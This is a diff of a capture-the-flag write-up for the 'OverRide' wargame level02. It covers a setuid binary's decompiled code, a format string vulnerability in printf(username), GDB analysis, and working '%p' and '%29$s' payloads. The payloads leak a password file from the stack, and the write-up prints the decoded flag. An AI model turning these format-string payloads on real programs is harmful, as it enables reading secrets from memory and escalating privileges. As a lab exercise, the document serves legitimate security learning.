@@ -1,92 +1,155 @@
 
-=> To test this binary we need to copy it and modify the file opening
-file_pass = fopen("/home/users/level03/.pass", "r"); replace "level03" to "level02"
+# level02
 
-=> We see a potential vulnerabilty at the end of the file with the printf(username)
-=> We can exploit a format string exploit, let's try to read the data in the buff_flag
+## General Informations 
 
-=> The flag is saved in a buffer
-=> In the assembly code before the call to fread we can see that buff_flag is at [rbp - 0xa0]
-for exemple before the fread, addr is loaded with LEA
-   0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax
-   0x00000000004008ed <+217>:	mov    -0x8(%rbp),%rdx
-   0x00000000004008f1 <+221>:	mov    %rdx,%rcx
-   0x00000000004008f4 <+224>:	mov    $0x29,%edx
-   0x00000000004008f9 <+229>:	mov    $0x1,%esi
-   0x00000000004008fe <+234>:	mov    %rax,%rdi
-   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt>
-   0x0000000000400906 <+242>:	mov    %eax,-0xc(%rbp)
+**Path** : `/home/users/level02/level02` </br>
+**File** : 
+```
+level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02`  </br>
+**Protections**:
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level02
+```
 
-=> Break just after the fread
-b *0x0000000000400906
+## Static Analysis
 
-=> We can then read the buffer
-(gdb) x/s $rbp - 0xa0
-0x7fffffffe580:	 "PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv\n"
+After decompiling the binary in ghidra, we get the pseudo code below: 
 
-=> Now that we have a address to print we will contruct the payload
-=> We need to calcul the offset
+```
+undefined8 main(void)
 
-r < <(python -c 'print "\x80\xe5\xff\xff\xff\x7f" +  "%p "*30')
+{
+  int iVar1;
+  size_t sVar2;
+  long lVar3;
+  char *pcVar4;
+  char password_buffer [112];
+  char pass_buffer [48];
+  char username_buffer [100];
+  int local_14;
+  FILE *fpass;
+  
+  pcVar4 = username_buffer;
+  ... # Buffer Initializations
+  fpass = (FILE *)0x0;
+  local_14 = 0;
+  fpass = fopen("/home/users/level03/.pass","r");
+  if (fpass == (FILE *)0x0) {
+    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  sVar2 = fread(pass_buffer,1,0x29,fpass);
+  local_14 = (int)sVar2;
+  sVar2 = strcspn(pass_buffer,"\n");
+  pass_buffer[sVar2] = '\0';
+  if (local_14 != 0x29) {
+    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  fclose(fpass);
+  puts("===== [ Secure Access System v1.0 ] =====");
+  puts("/***************************************\\");
+  puts("| You must login to access this system. |");
+  puts("\\**************************************/");
+  printf("--[ Username: ");
+  fgets(username_buffer,100,stdin);
+  sVar2 = strcspn(username_buffer,"\n");
+  username_buffer[sVar2] = '\0';
+  printf("--[ Password: ");
+  fgets(password_buffer,100,stdin);
+  sVar2 = strcspn(password_buffer,"\n");
+  password_buffer[sVar2] = '\0';
+  puts("*****************************************");
+  iVar1 = strncmp(pass_buffer,password_buffer,0x29);
+  if (iVar1 == 0) {
+    printf("Greetings, %s!\n",username_buffer);
+    system("/bin/sh");
+    return 0;
+  }
+  printf(username_buffer);
+  puts(" does not have access!");
+                    /* WARNING: Subroutine does not return */
+  exit(1);
+}
+```
 
-�����0x7fffffffe510 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe708
-0x1f7ff9a08 0x42424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil)
-(nil) 0x100000000 (nil) 0x38614e674c427750 0x3735574b544d3870 0x43514156787a3753
-0x714a385670436e78 0x7642455839735454 (nil) 0x70257fffffffe580 <- our address prefixed by 7025 at the 28th addresses
+`main`
+  - Read the pass file and store it in a buffer of 48 bytes `pass_buffer[48]`
+  - Asks a username and stores it in a buffer of 100 bytes `username_buffer[100]` 
+  - Asks a password and stores it in a buffer of 112 bytes `password_buffer[112]`, then compare it to the pass buffer 
+  - If the password input buffer and the flag buffer are equals then a shell is launched and greetings message is displayes
+  - Else the `username_buffer` is passed to `printf` and is displayed with an error message
 
+## Vulnerability found 
 
-=> Super ! Let's create the format string
-r < <(python -c 'print "\x80\xe5\xff\xff\xff\x7f" + "%28$s"')
+We have a format string vulnerability with `printf` being called with the `username_buffer` input passed directly in argument, allowing us to read or write on arbitrary addresses.
 
-=> Problem, We have a SEGFAULT ! It's because on the stack, the address is prefixed by 3225 (%2)
-x/50gx $rsp (display value 8 bytes)
+## Dynamic Analysis
+
+Before begining the dynamic analysis with GDB we need to edit the binary in Ghidra, because one of the first instructions (`  fpass = fopen("/home/users/level03/.pass","r");`) is an open on a file that GDB don't have permission. </br>
+- Open ghidra, 
+- Click where the string `"/home/users/level03/.pass"` resides (`.rodata`) and right click on it
+- Select `Patch Data` and replace the pass path by `/tmp/pass`, press enter
+- Export by typing `o` and select the format to `Original File`
+- Once savec on your session, copy it to the vm with `scp` </br>
+`scp -P 4242 ./level02_patched level02@ip_vm:/tmp/level02_patched`
+- Create the pass `python -c 'print "Z"*41' > /tmp/pass`, take care to write 41 characters in the file
+
+Let's begin the dynamic analysis, we put a breakpoint just after the `printf` call:
+```
+(gdb) b *0x0000000000400a85
+```
+
+Then we run a payload to get the padding of the first bytes of the input:
+```
+(gdb) r < <(python -c 'print "AAAAAAAA" + " %p" * 30 + "\nBBBBB"')
 ...
-0x7fffffffe5b0:	0x32257fffffffe580	0x0000000000732438
-...
+AAAAAAAA 0x7fffffffe3d0 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe5c8 0x1f7ff9a08 0x4242424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x5a5a5a5a5a5a5a5a 0x5a5a5a5a5a5a5a5a 0x5a5a5a5a5a5a5a5a 0x5a5a5a5a5a5a5a5a 0x5a5a5a5a5a5a5a5a 0x5a 0x4141414141414141 <- (AAAAAAAA) ...
+```
+Oh ! If we look at the stack we see multiple addresses like `0x5a5a5a5a5a5a5a5a`, wich is interesing because these adresses are equal to `ZZZZZZZZ` - the content of the flag passed in the file `/tmp/pass`.
 
-=> Our address is 8 bytes long on 64 bits system, and we writed 6 on the 8 bytes
-=> We can't add null bytes (\x00) like: "\x60\xe4\xff\xff\xff\x7f\x00\x00" + "%28$s"
-because printf will stop and ignore the rest of the payload
+It means that we can display the pass file content by reading the stack !
 
-=> Let's put the put the address at the end then and add 1 to the offset
-r < <(python -c 'print "%00029$s" + "\x80\xe5\xff\xff\xff\x7f"')
 
-=> This time we can see that is no more prefixed, we have only 0 in the stack
-0x7fffffffe5b0:	0x7324393230303025	0x00007fffffffe580
-0x7fffffffe5c0:	0x0000000000000000	0x0000000000000000
+## Payload construction 
 
-=> The address is misaligned we need to add 3 characters
-python -c 'print "%00029$s" + "\x80\xe5\xff\xff\xff\x7f"'
+We can print the datas in the stack by using the `%p` specifier:
+```
+python -c 'print "%p " * 28'
+```
 
-=> We have a difference outside gdb, we tests differents values and we found
--> patch binary
-(python -c 'print "%00029$s" + "\x70\xe5\xff\xff\xff\x7f"') | ./level02
 
--> real binary
-(python -c 'print "%00029$s" + "\x40\xe5\xff\xff\xff\x7f"') | ~/level02
+## Demonstration 
 
------------------------------------------------------------------------------------
+```
+level02@OverRide:~$ python -c 'print "%p " * 28' | ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffe3e0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe5d8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025  does not have access!
+```
 
-1. Vulnerability
+We can extract these values and convert them in char ([converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)): 
+```
+0x756e505234376848 -> unPR47hH (little endian) -> Hh74RPnu
+0x45414a3561733951 -> EAJ5as9Q                 -> Q9sa5JAE 
+0x377a7143574e6758 -> 7zqCWNgX                 -> XgNWCqz7
+0x354a35686e475873 -> 5J5hnGXs                 -> sXGnh5J5
+0x48336750664b394d -> H3gPfK9M                 -> M9KfPg3H
+```
 
-	- The function printf(username) is vulnerable to a format string attack because it directly uses the username variable
-	as the format string without any validation or sanitization.
-	- This vulnerability allows attackers to read (or potentially write) arbitrary memory by manipulating the input
-	with format specifiers like %p, %x, etc.
+Which gives us:
+`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
 
-2. Exploit
-
-	```python
-	python -c 'print("%p "*30)' | ./level02
-	python -c 'print("\x50\xe5\xff\xff\xff\x7f" + "%p " * 28 + "\n")' | ./level02
-	```
-
-3. Decode the password
-
-	```
-	0x756e505234376848 -> Hh74RPnu
-	0x45414a3561733951 -> Q9sa5JA5
-	0x377a7143574e6758 -> XgNWCqz7
-	0x354a35686e475873 -> sXGnh5J5
-	0x48336750664b394d -> M9KfPg3H
-	```
+## Flag 
+```
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
